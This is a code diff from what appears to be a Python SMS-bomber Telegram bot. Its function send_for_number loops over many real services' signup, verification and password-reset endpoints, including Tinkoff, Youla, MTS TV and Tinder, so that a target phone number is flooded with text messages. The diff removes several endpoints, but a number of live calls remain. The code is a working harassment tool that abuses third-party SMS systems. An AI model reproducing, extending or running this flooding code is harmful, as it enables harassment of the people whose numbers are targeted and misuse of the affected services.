@@ -111,77 +111,13 @@ def send_for_number(phone):
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
             requests.post("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+" + _phone})
             requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone})
-            
-            requests.post(
-                    "https://secure.online.ua/ajax/check_phone/",
-                    params={"reg_phone": _phone},
-                )
-            requests.post(
-                    "https://cabinet.planetakino.ua/service/sms",
-                    params={"phone": _phone},
-                )
-            requests.post(
-                    "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
-                    json={"phone": _phone},
-                )
-            requests.get(
-                    "https://www.finam.ru/api/smslocker/sendcode",
-                    data={"phone": "+" + _phone},
-                )
-            requests.post(
-                    "https://account.my.games/signup_send_sms/", data={"phone": _phone}
-                )
-            requests.post(
-                    "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
-                    data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},
-                )
-            requests.post(
-                    "https://city24.ua/personalaccount/account/registration",
-                    data={"PhoneNumber": _phone},
-                )
-            requests.post(
-                    "https://client-api.sushi-master.ru/api/v1/auth/init",
-                    json={"phone": _phone},
-                )
-            requests.post(
-                    "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
-                )
-            requests.get(
-                    "https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32",
-                    data={"phone": _phone},
-                )
-            requests.post(
-                    "https://thehive.pro/auth/signup", json={"phone": "+" + _phone,}
-                )
-            requests.post(
-                    "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
-                    data={"phone_number": _phone},
-                    headers={},
-                )
             requests.post(
                     "https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={}
                 )
             requests.post(
                     "https://youla.ru/web-api/auth/request_code", data={"phone": _phone}
                 )
-            requests.post(
-                    "https://pizzahut.ru/account/password-reset",
-                    data={
-                        "reset_by": "phone",
-                        "action_id": "pass-recovery",
-                        "phone": _phonePizzahut,
-                        "_token": "*",
-                    },
-                )
-            requests.post(
-                    "https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
-                    data={"name": _name, "phone": _phone, "promo": "yellowforma"},
-                )
-            requests.post(
-                    "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
-                    data={"phone": _phone},
-                )
-            print('Тест на номер', phone)
+        
             iteration += 1
 
 @bot.message_handler(commands=["addbl"])
